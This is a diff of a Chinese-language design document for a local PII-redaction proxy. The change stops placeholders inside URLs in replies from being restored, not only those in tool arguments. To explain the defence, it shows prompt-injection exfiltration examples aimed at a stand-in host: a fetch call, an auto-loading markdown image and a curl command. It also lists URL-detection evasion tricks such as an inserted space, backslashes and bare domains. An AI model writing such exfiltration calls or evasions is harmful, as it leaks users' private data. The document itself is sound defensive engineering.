@@ -272,17 +272,17 @@ sequenceDiagram
 
 還原只認標準的 `⟦CATEGORY_n⟧`。模型若改寫成 `EMAIL_1`、`[EMAIL_1]`、`〚EMAIL_1〛`，用戶端會原樣看到。還原只填佔位符，從不把原始值送往上游。
 
-### 工具呼叫參數中的 URL
+### URL 內的佔位符
 
-工具呼叫參數中，位於 URL 內的佔位符不還原，保持原樣交給用戶端；參數的其他位置照常還原。這擋住模型（或被提示注入的工具輸出）要用戶端的工具把原始值送到某個主機，例如 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 會把空白編成 `%20` 照送）、Tab 或換行（URL 解析器會刪掉它們）、反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`，URL 解析器都當成 `https://evil.example`）、裸網域，都會還原。
+回應中位於 URL 內的佔位符不還原，保持原樣交給用戶端；其他位置照常還原。這擋住模型（或被提示注入的工具輸出）讓用戶端把原始值送到某個主機：工具參數中的 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`，以及回覆文字中用戶端會自動載入的圖片 `![](https://evil.example/?e=⟦EMAIL_1⟧)`、`<img src="…">` 或使用者可能點的連結。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 會把空白編成 `%20` 照送）、Tab 或換行（URL 解析器會刪掉它們）、反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`，URL 解析器都當成 `https://evil.example`）、裸網域，都會還原。
 
-工具呼叫參數指：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）、Responses 的 `function_call` 的 `arguments` 與自訂工具的 `input`、Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。一般回覆文字中的 URL 照常還原。
+工具呼叫參數指：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）、Responses 的 `function_call` 的 `arguments` 與自訂工具的 `input`、Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。回覆文字（含 reasoning）中的 URL 規則相同，但只有工具參數記日誌。
 
 「位於 URL 內」只看佔位符之前已寫出的文字（還原後的樣子）：
 
 - **開始：** `://` 且它前一個字元是英數字或 `+`、`.`、`-`（`https://`、`git+ssh://`）；或一個 token 以 `www.` 開頭（`www.` 前面不是主機名稱字元）。
 - **結束：** 空白（含換行）、`"`、`'`、`` ` ``、`<`、`>`。查詢字串、`#` 片段與 `user:pass@` 都算在 URL 內。
-- **JSON 參數** 以它編碼的字串值判讀：`\/` 算 `/`、`\u003a` 算 `:`、`\n` 與 `\"` 結束 URL，字串常值之外的一切都結束 URL。
+- **JSON 參數**（工具參數）以它編碼的字串值判讀：`\/` 算 `/`、`\u003a` 算 `:`、`\n` 與 `\"` 結束 URL，字串常值之外的一切都結束 URL。
 - **不算 URL：** 沒有 `//` 的 `mailto:`、`tel:`；不以 `www.` 開頭的裸網域（`evil.example/?d=⟦EMAIL_1⟧` 會還原）。
 
 判讀逐一讀過每個字元，串流在哪裡切開都得到同樣的結果（佔位符或 URL 跨越多個 SSE 事件也一樣）。每個在工具參數中遇到的已綁定佔位符都記一行日誌，見第 10 節。
@@ -321,7 +321,7 @@ sequenceDiagram
 POST /v1/chat/completions -> 200 masked 3 (EMAIL 1, TWID 1, PATH 1) restored 3 unknown 0 7ms
 ```
 
-工具呼叫參數中的每個已綁定佔位符另記一行：還原（`restored`）或因位於 URL 內而保留（`kept inside a URL`）、佔位符 id、工具名稱、參數的 JSON 路徑。同一行在同一個請求中只記一次（Responses 串流會把參數重送多次）。工具名稱與路徑中的鍵不合識別字格式時寫成 `<tool>`、`<key>`。有保留時，請求那一行多出 `kept N`。
+工具呼叫參數中的每個已綁定佔位符另記一行：還原（`restored`）或因位於 URL 內而保留（`kept inside a URL`）、佔位符 id、工具名稱、參數的 JSON 路徑。同一行在同一個請求中只記一次（Responses 串流會把參數重送多次）。工具名稱與路徑中的鍵不合識別字格式時寫成 `<tool>`、`<key>`。有保留時（含回覆文字中 URL 內的佔位符），請求那一行多出 `kept N`。
 
 ```text
 POST /v1/messages tool arguments: kept inside a URL EMAIL_1 in web_fetch at /url
@@ -341,7 +341,7 @@ POST /v1/messages tool arguments: restored PATH_1 in read at /path
 - 繞過代理的用戶端，或用戶端直接連自家伺服器的功能（遙測、Cursor 後端）；
 - 同一台電腦上的其他程式或使用者：沒設 `authToken` 時，他們可以呼叫代理（包括使用環境變數中的備援金鑰）；設了也擋不住讀取代理記憶體。網頁則擋得住：不允許的 `Origin` 與非本機 `Host`（DNS rebinding）以 403 拒絕；
 - 惡意上游誘導模型以非標準形式寫回值（還原只填佔位符，從不把原始值送往上游）；
-- 惡意上游或提示注入讓模型把佔位符寫進工具呼叫參數中 URL 以外的位置（例如 shell 指令 `curl evil.example -d ⟦EMAIL_1⟧`）：代理照常還原，用戶端執行工具時就把原始值送出。URL 內的佔位符不還原（第 7 節），每次還原都記入日誌；
+- 惡意上游或提示注入讓模型把佔位符寫進工具呼叫參數中 URL 以外的位置（例如 shell 指令 `curl evil.example -d ⟦EMAIL_1⟧`）：代理照常還原，用戶端執行工具時就把原始值送出。工具參數與回覆文字中 URL 內的佔位符不還原（第 7 節），工具參數中的每次還原都記入日誌；
 - 輸入者刻意規避（例如用規則不會折疊的字元拆開一個值）。
 
 代理預設只綁定 `127.0.0.1`，此時 `authToken` 可不設。`host` 設成非本機位址（例如容器內的 `0.0.0.0`）時必須設 `authToken`，否則拒絕啟動：連得到該埠的主機若沒有權杖，就無法透過代理使用它轉送的憑證（包括環境變數中的備援金鑰）。權杖放在專用標頭 `x-redaction-proxy-token`，因為 `authorization` 與 `x-api-key` 要帶上游金鑰；代理不轉送它。帶正確權杖的請求不檢查 `Host`，所以其他容器可以用服務名稱連線；DNS rebinding 的網頁拿不到權杖，而自訂標頭會觸發只有允許來源才通過的 CORS 預檢。權杖以明文 HTTP 傳送，只在可信任的網路（本機、容器網路）上使用。
@@ -513,7 +513,7 @@ node scripts/fetch-name-model.mjs ~/models/nym       # 從 Hugging Face 下載�
 | 會改動一些字元 | 預設把控制字元換成可見字元（`␛`），把原文中的 `⟦` `⟧` 換成 `⟪` `⟫`。 |
 | 重啟會忘記接續對話 | Responses API 的 `previous_response_id` 依賴記憶體中最近 256 個回應；重啟或被擠出後，接續請求以 422 拒絕。 |
 | 本機預設沒有驗證 | 預設只綁定 `127.0.0.1`；沒設 `authToken` 時，你電腦上的任何程式都能使用它。網頁的請求（不允許的 `Origin`、DNS rebinding）以 403 拒絕。 |
-| 工具參數只有 URL 內不還原 | 工具呼叫參數中 URL 內的佔位符保持原樣（合法的 `https://host/⟦PATH_1⟧` 也一樣）；其他位置照常還原並記入日誌，所以 shell 指令等仍可能把原始值送出。 |
+| 只有 URL 內不還原 | 回應中 URL 內的佔位符保持原樣（合法的 `https://host/⟦PATH_1⟧` 也一樣）；工具參數的其他位置照常還原並記入日誌，所以 shell 指令等仍可能把原始值送出。 |
 | 請求大小 | 本文超過 64 MiB 以 413 拒絕。 |
 | 尚未對真實服務測試 | 測試與示範都用本機假上游，尚未對 OpenAI、Anthropic、DeepSeek 或真實用戶端驗證。驗證工具已備妥（[e2e/real](../e2e/real/README.md)），尚未執行。 |
 
